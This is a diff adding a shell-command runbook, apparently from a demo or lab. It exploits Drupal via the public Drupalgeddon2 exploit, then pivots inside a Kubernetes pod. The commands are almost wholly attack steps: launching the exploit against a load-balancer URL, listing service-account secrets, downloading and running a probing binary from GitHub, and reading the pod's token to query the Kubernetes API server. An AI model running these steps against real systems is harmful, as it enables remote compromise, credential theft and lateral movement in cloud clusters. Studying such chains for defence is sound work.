@@ -1,0 +1,32 @@
+# Download exploit 
+git clone https://github.com/dreadlocked/Drupalgeddon2
+
+# Download exploit dependency
+gem install highline
+
+# Launch exploit
+./drupalgeddon2.rb http://<my-load-balancer>.us-east-1.elb.amazonaws.com
+
+# Verify exploit successful
+whoami
+la -la
+env | grep -i kube
+
+# List directory with k8s service account tokens
+ls -la /var/run/secrets/kubernetes.io/serviceaccount
+
+# Download amicontained to probe w/in k8s cluster
+cd /tmp
+curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64
+
+# Give executable permissions to amicontained
+chmod 555 amicontained
+./amicontained
+
+# Probe k8s from w/in cluster
+curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
+
+# Probe API server info from w/in cluster
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api --header "Authorization: Bearer $TOKEN"
